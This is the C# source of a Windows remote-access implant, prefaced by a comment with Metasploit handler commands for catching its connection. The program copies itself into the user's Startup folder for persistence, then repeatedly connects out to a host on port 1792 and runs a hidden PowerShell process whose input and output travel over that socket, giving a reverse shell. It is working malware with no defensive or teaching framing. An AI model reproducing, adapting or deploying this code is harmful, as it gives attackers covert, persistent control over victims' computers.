/*
use multi/handler
set PAYLOAD windows/shell_reverse_tcp 
set LHOST address
set LPORT 1792
set ExitOnSession 0
run -jz
sessions

convert console for gui 
https://www.codeguru.com/cpp/w-p/system/misc/article.php/c2897/Determine-if-an-Application-is-Console-or-GUI.htm
https://upload.wikimedia.org/wikipedia/commons/1/1b/Portable_Executable_32_bit_Structure_in_SVG_fixed.svg

*/
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace W
{
    public class One
    {
        static StreamWriter streamWriter;

        static void Main(string[] args)
        {
            Persistence();
            while (true)
            {
                try
                {
                    OpenShell();
                }
                finally
                {
                    Thread.Sleep(5000);
                }
            }
        }

        static void OpenShell()
        {
            TcpClient client = new TcpClient("server", 1792);
            client.ReceiveTimeout = 300000;
            Stream stream = client.GetStream();
            StreamReader rdr = new StreamReader(stream);
            streamWriter = new StreamWriter(stream);

            StringBuilder strInput = new StringBuilder();

            Process p = new Process();
            p.StartInfo.FileName = "powershell";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardError = true;
            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
            p.Start();
            p.BeginOutputReadLine();

            string line;
            while ((line = rdr.ReadLine()) != null)
            {
                strInput.Append (line);
                p.StandardInput.WriteLine (strInput);
                strInput.Remove(0, strInput.Length);
            }
        }

        static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine (strOutput);
                    streamWriter.Flush();
                }
                catch (Exception)
                {
                }
            }
        }

        static void Persistence()
        {
            try
            {
                string pathStartUp = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                var exe = Process.GetCurrentProcess().MainModule.FileName;
                var destiny = Path.Combine(pathStartUp, Path.GetFileName(exe));
                if (!(new FileInfo(destiny).Exists))
                {
                    var data = File.ReadAllBytes(exe);
                    File.WriteAllBytes (destiny, data);
                }
            }
            catch (Exception)
            {
            }
        }
    }
}
